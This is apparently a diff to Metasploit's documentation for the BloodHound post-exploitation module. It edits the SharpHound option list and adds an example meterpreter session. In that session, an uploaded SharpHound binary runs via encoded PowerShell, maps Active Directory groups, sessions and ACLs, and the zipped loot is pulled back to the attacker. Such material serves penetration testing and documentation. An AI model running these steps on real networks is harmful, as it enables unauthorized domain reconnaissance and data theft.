@@ -28,26 +28,13 @@ This module can take several/many minutes to run due to the volume of data being
 
   Specifies the domain to enumerate. If not specified, will enumerate the current domain your user context specifies.
 
-  **SearchForest**
-
-  Expands data collection to include all domains in the forest. The default value is `false`.
-
   **Stealth**
 
   Use stealth collection options, will sacrifice data quality in favor of much reduced network impact. The default value is `false`.
 
-  **SkipGCDeconfliction**
-
-  Skips Global Catalog deconfliction during session enumeration. This option can result in more inaccuracy in data.
-  The default value is `false`.
-
-  **ExcludeDC**
+  **ExcludeDomainControllers**
 
   Exclude domain controllers from session queries. Useful for ATA environments which detect this behavior. The default value is `false`.
-
-  **OU**
-
-  Limit enumeration to this OU. Takes a DistinguishedName.
 
   **DomainController**
 
@@ -61,46 +48,16 @@ This module can take several/many minutes to run due to the volume of data being
 
   Uses LDAPs instead of unencrypted LDAP on port 636. The default value is `false`.
 
-  **IgnoreLdapCert**
-
-  Ignores the certificate for LDAP. The default value is `false`.
-
-  **LDAPUser**
-
-  User to connect to LDAP with.
-
-  **LDAPPass**
-
-  Password for user you are connecting to LDAP with.
-
   **DisableKerbSigning**
 
   Disables Kerberos Signing on requests. The default value is `false`.
-
-  **Threads**
-
-  Specifies the number of threads to use during enumeration. The default value is `10`.
-
-  **PingTimeout**
-
-  Specifies timeout for ping requests to computers in milliseconds. The default value is `259`.
 
   **SkipPing**
 
   Skip all ping checks for computers. This option will most likely be slower as API calls will be made to all computers regardless of
   being up Use this option if ping is disabled on the network for some reason. The default value is `false`.
 
-  **LoopDelay**
-
-  Amount of time to wait between session enumeration loops in minutes. This option should be used in conjunction with
-  the `SessionLoop` enumeration method. The default value is `300`.
-
-  **MaxLoopTime**
-
-  Length of time to run looped session collection. Format: 0d0h0m0s or any variation of this format.
-  Use in conjunction with `-CollectionMethod SessionLoop`. Default will loop for two hours.
-
-  **JSONFolder**
+  **OutputFolder**
 
   Folder to write the JSON output to.  Default is to enumerate the Windows Temp folder.
 
@@ -139,4 +96,59 @@ meterpreter > run post/windows/gather/bloodhound
 [*] Compressing data to C:\Windows\TEMP\20190429064444_BloodHound.zip.
 [*] You can upload this file directly to the UI.
 [*] Finished compressing files!
+```
+
+### Windows 10 non-AD host, Windows Server 2012 AD, Disk Method
+
+```
+meterpreter > sysinfo
+Computer        : WIN10PROLICENSE
+OS              : Windows 10 (10.0 Build 16299).
+Architecture    : x64
+System Language : en_US
+Domain          : hoodiecola
+Logged On Users : 7
+Meterpreter     : x86/windows
+meterpreter > background
+[*] Backgrounding session 1...
+msf5 post(windows/gather/bloodhound) > set method disk
+method => disk
+msf5 post(windows/gather/bloodhound) > exploit
+
+[*] Uploading sharphound.exe as C:\Users\user\Desktop\qehojlwml.exe
+[*] Loading BloodHound with: . C:\Users\user\Desktop\qehojlwml.exe --outputdirectory "C:\Users\user\AppData\Local\Temp" --zipfilename eiqxerh --encryptzip --nosavecache 
+[+] EXECUTING:
+powershell.exe -EncodedCommand LgAgAEMAOgBcAFUAcwBlAHIAcwBcAHQAYQByAGEAXABEAGUAcwBrAHQAbwBwAFwAcQBlAGgAbwBqAGwAdwBtAGwALgBlAHgAZQAgAC0ALQBvAHUAdABwAHUAdABkAGkAcgBlAGMAdABvAHIAeQAgACIAQwA6AFwAVQBzAGUAcgBzAFwAdABhAHIAYQBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwACIAIAAtAC0AegBpAHAAZgBpAGwAZQBuAGEAbQBlACAAZQBpAHEAeABlAHIAaAAgAC0ALQBlAG4AYwByAHkAcAB0AHoAaQBwACAALQAtAG4AbwBzAGEAdgBlAGMAYQBjAGgAZQAgADsAIAA= -InputFormat None
+[*] ----------------------------------------------
+[*] Initializing SharpHound at 4:19 PM on 6/3/2020
+[*] ----------------------------------------------
+[*] 
+[*] Resolved Collection Methods: Group, Sessions, Trusts, ACL, ObjectProps, LocalGroups, SPNTargets, Container
+[*] 
+[*] [+] Creating Schema map for domain HOODIECOLA.COM using path CN=Schema,CN=Configuration,DC=HOODIECOLA,DC=COM
+[*] [+] Cache File not Found: 0 Objects in cache
+[*] 
+[*] [+] Pre-populating Domain Controller SIDS
+[*] Status: 0 objects finished (+0) -- Using 19 MB RAM
+[*] Status: 63 objects finished (+63 21)/s -- Using 26 MB RAM
+[*] Enumeration finished in 00:00:03.3219377
+[*] Compressing data to C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip
+[*] Password for Zip file is QEqUpTtU0v. Unzip files manually to upload to interface
+[*] 
+[*] SharpHound Enumeration Completed at 4:19 PM on 6/3/2020! Happy Graphing!
+[*] 
+[+] Downloaded C:\Users\user\AppData\Local\Temp\20200603161905_eiqxerh.zip: /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip
+[+] Zip password: QEqUpTtU0v
+[*] Deleting C:\Users\user\Desktop\qehojlwml.exe
+[*] Post module execution completed
+
+msf5 post(windows/gather/bloodhound) > notes
+
+Notes
+=====
+
+ Time                     Host          Service  Port  Protocol  Type                     Data
+ ----                     ----          -------  ----  --------  ----                     ----
+ 2020-06-03 23:27:05 UTC  2.2.2.2                           Sharphound Zip Password  "Bloodhound/Sharphound loot /metasploit/.msf4/loot/20200603192705_default_2.2.2.2_windows.ad.blood_749446.zip password is QEqUpTtU0v"
+
 ```
